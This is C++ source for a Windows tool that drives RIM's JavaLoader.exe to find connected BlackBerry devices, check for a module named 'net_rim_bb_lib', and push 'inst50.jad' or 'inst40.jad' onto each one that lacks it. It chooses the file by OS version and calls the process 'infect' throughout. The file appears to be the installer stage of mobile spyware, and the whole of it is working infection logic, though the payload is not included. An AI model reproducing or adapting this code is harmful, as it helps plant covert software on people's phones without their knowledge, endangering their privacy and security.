// JavaLoaderHelper.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include <direct.h>
#include <time.h>

#include <string>
#include <iostream>
#include <vector>

#include <fstream>
#include <sstream>
#include <set>

#define GetCurrentDir _wgetcwd

//#include <stdio.h>
using namespace std;

const wstring JAVALOADER = L"JavaLoader.exe";
//const wstring JADDIR = L"";
const wstring JADEXT = L"jad";
const wstring INTERRUPT_ERROR = L"Error";

boolean debugEnabled = true;
//wostream & debug = debugEnabled? wofstream(L"debug.txt", ios::out | ios::app): wcout;
wofstream fdebug(L"inst.txt", ios::out | ios::trunc);
wostream & debug = debugEnabled? fdebug: wcout;

enum infect_result { OK, IS_INSTALLED, NOT_INSTALLED, ERR_PASSWORD, ERR_DIR, ERR_LOAD, ERR_GENERIC, ERR_COM, NOT_YET  };

wstring ExePath() {
	WCHAR szEXEPath[2048];
	GetModuleFileName ( NULL, szEXEPath, 2048 );
	wstring ret = szEXEPath;
	int pos = ret.rfind(L"\\" );
	return ret.substr( 0, pos);
}

wstring Pwd() {
	WCHAR cCurrentPath[FILENAME_MAX];
	if (!GetCurrentDir(cCurrentPath, sizeof(cCurrentPath) / sizeof(WCHAR)))
	{
		return L"";
	}

	return cCurrentPath;
}

int SearchDirectory(vector<wstring> &refvecFiles,
	const wstring &refcstrRootDirectory,
	const wstring &refcstrExtension,
	bool bSearchSubdirectories = true)
{
	wstring strFilePath; // Filepath
	wstring strPattern; // Pattern
	wstring strExtension; // Extension
	HANDLE hFile; // Handle to file
	WIN32_FIND_DATA FileInformation; // File information

	strPattern = refcstrRootDirectory + L"\\*.*";

	hFile = ::FindFirstFile(strPattern.c_str(), &FileInformation);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		do
		{
			if(FileInformation.cFileName[0] != '.')
			{
				strFilePath.erase();
				strFilePath = refcstrRootDirectory + L"\\" + FileInformation.cFileName;

				if(FileInformation.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
				{
					if(bSearchSubdirectories)
					{
						// Search subdirectory
						int iRC = SearchDirectory(refvecFiles,
							strFilePath,
							refcstrExtension,
							bSearchSubdirectories);
						if(iRC)
							return iRC;
					}
				}
				else
				{
					// Check extension
					strExtension = FileInformation.cFileName;
					strExtension = strExtension.substr(strExtension.rfind(L".") + 1);

					if(strExtension == refcstrExtension)
					{
						// Save filename
						refvecFiles.push_back(strFilePath);
					}
				}
			}
		} while(::FindNextFile(hFile, &FileInformation) == TRUE);

		// Close handle
		::FindClose(hFile);

		DWORD dwError = ::GetLastError();
		if(dwError != ERROR_NO_MORE_FILES)
			return dwError;
	}

	return 0;
}

wstring Replace(const wstring& orig,const wstring& fnd, const wstring& repl)
{
	wstring ret = orig;
	size_t pos = 0;

	while(true)
	{
		pos = ret.find(fnd,pos);
		if(pos == wstring::npos)  // no more instances found
			break;

		ret.replace(pos,fnd.size(),repl);  // replace old string with new string
		pos += repl.size();
	}

	return ret;
}

// execute a command and returns the stdout
wstring exec(wstring cmd, wstring args) {
	wstring interrupt = INTERRUPT_ERROR;
	SetCurrentDirectoryW(ExePath().c_str());
	wstring full_path=cmd + L" " + args;
	//wstring full_path = L"\"" + ExePath() + L"\\" + cmd + L"\" " + args;
	//full_path = Replace(full_path,L"\\",L"\\\\");
	//full_path = Replace(full_path,L" ",L"\\ ");
	debug << L"EXECUTING: " << full_path << endl;
	FILE* pipe = _wpopen(full_path.c_str(), L"r");
	if (!pipe) {
		debug<<"Exe not found"<<endl;
		return L"ERROR";
	}

	const int size = 128;
	WCHAR buffer[size];
	wstring result = L"";
	while(!feof(pipe)) {
		if(fgetws(buffer, size, pipe) != NULL){
			result += buffer;
			if(result.find(interrupt)!=-1){
				_pclose(pipe);
				debug<<result<<endl;
				return L"INTERRUPT";
			}
		}
	}
	_pclose(pipe);
	return result;
}

bool needToInfect(wstring pin, set<wstring> argv ) 
{
	if(argv.size()==0)
		return true;
	return argv.find(pin)!=argv.end();
}


boolean isError( wstring execResult ) 
{
	boolean pos = execResult.find(L"The system cannot find") != wstring::npos;
	boolean ret = (execResult==L"ERROR" || execResult==L"INTERRUPT" || pos);
	return ret;
}

// gets the OS version of a specific device.
// the version is a number of 4 digits.
// The mayor is represented by the first 2 digits
// ex: OS 4.6.1 is: 4061
boolean GetBBVersion(wstring pin, int* version ) 
{
	wstring vresult = exec( JAVALOADER, L" -p" + pin + L" deviceinfo ");

	std::wistringstream iss(vresult);
	std::wstring lversion;
	//wchar_t delimiter = L'\n'
	wstring vmsg=L"VM Version:";

	while(std::getline(iss, lversion))
	{
		if( lversion.find(vmsg)!=wstring::npos){
			string::size_type numpos = lversion.find(L"0x");
			if(numpos!=wstring::npos){
				wstring wversion = lversion.substr(numpos+2,4);
				debug << wversion << endl;

				*version = stoi(wversion);
				if(*version != NULL){
					return true;
				}
			}
		}
	}

	return false;

}

// load a speficic jad on a device identified by its pin
// returns OK or ERR_LOAD
infect_result loadJad(wstring pin, wstring jadname){
	wstring instresult = exec( JAVALOADER, L" -p" + pin + L" load " + jadname);
	debug << instresult<< endl;
	if(isError(instresult)){
		return ERR_LOAD;
	}
	return OK;
}

// infect a pin with the correct jad
// returns OK or ERR_LOAD
infect_result infect( wstring pin ) 
{
	bool result = false;
	
	debug<< L"INSTALLING"<<endl;
	vector<wstring> vecCodFiles;
	int iRC = 0;

	int version =0 ;
	boolean ret = GetBBVersion(pin, &version);
	debug<< ret << " version: " << version << endl;

	infect_result infected=NOT_YET;
	// get the version and tries to load the correct
	if(ret){
		
		if(version>0 && version <4050){
			debug << " not supported version: "<< version << endl;
			return ERR_GENERIC;
		}

		// see if it's at least OS 5.0
		if(version>=5000){
			infected=loadJad(pin,L"inst50.jad");
		}

		// try 
		Sleep(300);
		if(infected!=OK){
			infected=loadJad(pin,L"inst40.jad");
		}
								
	}	
	
	return infected==OK?OK:ERR_LOAD;
}


// check if the pin is already installed or not.
// if there are no errors it returns IS_INSTALLED or NOT_INSTALLED
infect_result isInstalled( std::wstring pin ) 
{

    wstring installedcodlist = exec( JAVALOADER, L" -p" + pin + L" dir -1");

	if( installedcodlist.find(L"Enter password")!=wstring::npos){
		debug << "PASSWORD PROTECTED" << endl;
		return ERR_PASSWORD;
	}

	if( installedcodlist.find(L"COM error during Open")!=wstring::npos){
		debug << "COM ERROR" << endl;
		return ERR_COM;
	}

	if(isError(installedcodlist) ){
		debug << "GENERIC ERROR" << endl;
		return ERR_GENERIC;
	}

	int pos = installedcodlist.find(L"net_rim_bb_lib\n");

	if(pos!=wstring::npos){
		debug<< "ALREADY INSTALLED"<<endl;
		return IS_INSTALLED;
	}else{
		return NOT_INSTALLED;
	}
}


int _tmain(int argc, _TCHAR* argv[])
{

	int infected=0;
	bool force=false;

	debug << time(NULL) << endl;
	wstring result = exec( JAVALOADER, L" enum");

	if(isError(result)){
		debug << "Unable to open port" << endl;
		return -1;
	}

	std::wistringstream iss(result);
	std::wstring pin;
	//wchar_t delimiter = L'\n'
	
	int i=0;
	while(std::getline(iss, pin))
	{
		debug << pin << std::endl;
		
		if(pin.substr(0,2) == L"0x"){
			debug<< ++i << " -> " <<pin << endl;
			Sleep(300);
			if(force || isInstalled(pin) == NOT_INSTALLED){
				Sleep(300);
				if(infect(pin)==OK){
					debug<<"INSTALLED "<<pin<<endl;
					infected++;
				}else{
					debug<<"WARNING: NOT INSTALLED "<<pin<<endl;
				}
			}else{
				debug<<"ALREADY INSTALLED "<<pin<<endl;
			}
		}		
	}
		
	return infected;
}

